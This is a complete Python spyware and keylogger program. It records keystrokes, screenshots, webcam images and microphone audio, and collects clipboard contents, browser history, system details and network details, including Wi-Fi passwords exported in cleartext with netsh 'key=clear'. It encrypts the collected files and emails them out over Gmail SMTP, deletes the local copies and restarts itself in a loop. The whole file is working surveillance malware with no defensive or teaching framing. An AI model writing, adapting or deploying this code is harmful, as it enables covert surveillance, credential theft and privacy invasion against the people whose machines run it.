import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener
# If the OS is Windows #
if os.name == 'nt':
    import win32clipboard



def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as session:
            session.starttls()
            session.login(email_address, password)
            session.sendmail(email_address, email_address, email.as_string())


    except smtplib.SMTPException as mail_err:
        print_err(f'Error occurred during email session: {mail_err}')
        logging.exception('Error occurred during email session: %s\n', mail_err)


def email_attach(path: Path, attach_file: str) -> MIMEBase:

    attach = MIMEBase('application', "octet-stream")
    attach_path = path / attach_file

    with attach_path.open('rb') as attachment:
        attach.set_payload(attachment.read())
    encoders.encode_base64(attach)
    attach.add_header('Content-Disposition', f'attachment;filename = {attach_file}')
    return attach


def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    message.attach(MIMEText(body, 'plain'))
    return message


def send_mail(path: Path, re_obj: object):
    # User loging information #
    email_address = ''         
    password = ''              

    msg = MIMEMultipart()
    email_header(msg, email_address)

    for file in os.scandir(path):
        if file.is_dir():
            continue

        if re_obj.re_xml.match(file.name) or re_obj.re_txt.match(file.name) \
        or re_obj.re_png.match(file.name) or re_obj.re_jpg.match(file.name):
            attachment = email_attach(path, file.name)
            msg.attach(attachment)

        elif re_obj.re_audio.match(file.name):
            msg_alt = MIMEMultipart()
            email_header(msg_alt, email_address)
            attachment = email_attach(path, file.name)
            msg_alt.attach(attachment)
            smtp_handler(email_address, password, msg_alt)

    smtp_handler(email_address, password, msg)


def encrypt_data(files: list, export_path: Path):
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

   
    for file in files:
       
        file_path = export_path / file
        crypt_path = export_path / f'e_{file}'
        try:
            with file_path.open('rb') as plain_text:
                data = plain_text.read()
            encrypted = Fernet(key).encrypt(data)

            with crypt_path.open('wb') as hidden_data:
                hidden_data.write(encrypted)

          
            file_path.unlink()

       
        except OSError as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)


class RegObject:
    def __init__(self):
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        # If the OS is Windows #
        if os.name == 'nt':
            self.re_audio = re.compile(r'.{1,255}\.wav$')
        # If the OS is Linux #
        else:
            self.re_audio = re.compile(r'.{1,255}\.mp4')


def webcam(webcam_path: Path):
    
    webcam_path.mkdir(parents=True, exist_ok=True)
    cam = cv2.VideoCapture(0)

    for current in range(1, 61):
     
        ret, img = cam.read()
        if ret:
           
            file_path = webcam_path / f'{current}_webcam.jpg'
            cv2.imwrite(str(file_path), img)

        time.sleep(5)

    cam.release()


def microphone(mic_path: Path):
 
    from scipy.io.wavfile import write as write_rec
    frames_per_second = 44100
    seconds = 60

    for current in range(1, 6):
        if os.name == 'nt':
            channel = 2
            rec_name = mic_path / f'{current}mic_recording.wav'
        else:
            channel = 1
            rec_name = mic_path / f'{current}mic_recording.mp4'
        my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                       samplerate=frames_per_second, channels=channel)

        sounddevice.wait()

        # Save the recording as proper format based on OS #
        write_rec(str(rec_name), frames_per_second, my_recording)


def screenshot(screenshot_path: Path):
    screenshot_path.mkdir(parents=True, exist_ok=True)

    for current in range(1, 61):
        pic = ImageGrab.grab()
        capture_path = screenshot_path / f'{current}_screenshot.png'
        pic.save(capture_path)
        time.sleep(5)


def log_keys(key_path: Path):
   
    # Set the log file and format #
    logging.basicConfig(filename=key_path, level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')
    # Join the keystroke listener thread #
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()


def get_browser_history(browser_file: Path):
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history = []
    browser_history.extend((bh_user, db_path, hist))

    try:
        
        with browser_file.open('w', encoding='utf-8') as browser_txt:
            browser_txt.write(json.dumps(browser_history))

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during browser history file operation: %s\n', file_err)


def get_clipboard(export_path: Path):
    try:
        # Access the clipboard #
        win32clipboard.OpenClipboard()
        # Copy the clipboard data #
        pasted_data = win32clipboard.GetClipboardData()

    
    except (OSError, TypeError):
        pasted_data = ''

    finally:
        # Close the clipboard #
        win32clipboard.CloseClipboard()

    clip_path = export_path / 'clipboard_info.txt'
    try:
        with clip_path.open('w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def get_system_info(sysinfo_file: Path):
    # If the OS is Windows #
    if os.name == 'nt':
        syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
    # If the OS is Linux #
    else:
        cmd0 = 'hostnamectl'
        cmd1 = 'lscpu'
        cmd2 = 'lsmem'
        cmd3 = 'lsusb'
        cmd4 = 'lspci'
        cmd5 = 'lshw'
        cmd6 = 'lsblk'
        cmd7 = 'df -h'

        syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'

    try:
        with sysinfo_file.open('a', encoding='utf-8') as system_info:
            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                # Execute child process #
                get_sysinfo.communicate(timeout=30)

    # If error occurs during file operation #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)
    except TimeoutExpired:
        pass


def linux_wifi_query(export_path: Path):
    get_wifis = None
    wifi_path = export_path / 'wifi_info.txt'

    try:
        get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])

    # If error occurs during process #
    except CalledProcessError as proc_err:
        logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)

    # If an SSID id list was successfully retrieved #
    if get_wifis:
        for wifi in get_wifis.split(b'\n'):
            if b'Wired' not in wifi:
                try:
                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
                        with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list,
                                   stderr=wifi_list, shell=True) as command:
                            command.communicate(timeout=60)
                except OSError as file_err:
                    print_err(f'Error occurred during file operation: {file_err}')
                    logging.exception('Error occurred during file operation: %s\n', file_err)

                # If process error or timeout occurs #
                except TimeoutExpired:
                    pass


def get_network_info(export_path: Path, network_file: Path):
    # If the OS is Windows #
    if os.name == 'nt':
        syntax = ['Netsh', 'WLAN', 'export', 'profile',
                  f'folder={str(export_path)}',
                  'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                  'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
    # If the OS is Linux #
    else:
        linux_wifi_query(export_path)

        cmd0 = 'ifconfig'
        cmd1 = 'arp -a'
        cmd2 = 'route'
        cmd3 = 'netstat -a'
        syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'

    try:
        # Open the network information file in write mode and log file in write mode #
        with network_file.open('w', encoding='utf-8') as network_io:
            try:
                with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
               
                    commands.communicate(timeout=60)
            except TimeoutExpired:
                pass
            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)

            try:
                public_ip = requests.get('https://api.ipify.org').text
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'
            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {ip_addr}\n')
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def main():
    # If the OS is Windows #
    if os.name == 'nt':
        export_path = Path('C:\\Tmp\\')
    # If the OS is Linux #
    else:
        export_path = Path('/tmp/logs/')

  
    export_path.mkdir(parents=True, exist_ok=True)
    network_file = export_path / 'network_info.txt'
    sysinfo_file = export_path / 'system_info.txt'
    browser_file = export_path / 'browser_info.txt'
    log_file = export_path / 'key_logs.txt'
    screenshot_dir = export_path / 'Screenshots'
    webcam_dir = export_path / 'WebcamPics'


    get_network_info(export_path, network_file)

    # Get the system information and save to output file #
    get_system_info(sysinfo_file)

    # If OS is Windows #
    if os.name == 'nt':
        get_clipboard(export_path)
    get_browser_history(browser_file)

    proc_1 = Process(target=log_keys, args=(log_file,))
    proc_1.start()
    proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
    proc_2.start()
    proc_3 = Thread(target=microphone, args=(export_path,))
    proc_3.start()
    proc_4 = Thread(target=webcam, args=(webcam_dir,))
    proc_4.start()

    proc_1.join(timeout=300)
    proc_2.join(timeout=300)
    proc_3.join(timeout=300)
    proc_4.join(timeout=300)

    proc_1.terminate()

    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']

    regex_obj = RegObject()

    # If the OS is Windows #
    if os.name == 'nt':
        # Add clipboard file to list #
        files.append('clipboard_info.txt')

        [files.append(file.name) for file in os.scandir(export_path)
         if regex_obj.re_xml.match(file.name)]
    # If the OS is Linux #
    else:
        files.append('wifi_info.txt')

    encrypt_data(files, export_path)
    send_mail(export_path, regex_obj)
    send_mail(screenshot_dir, regex_obj)
    send_mail(webcam_dir, regex_obj)

    
    shutil.rmtree(export_path)
    main()


def print_err(msg: str):
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


if __name__ == '__main__':
    try:
        main()

    # If Ctrl + C is detected #
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    # If unknown exception occurs #
    except Exception as ex:
        print_err(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)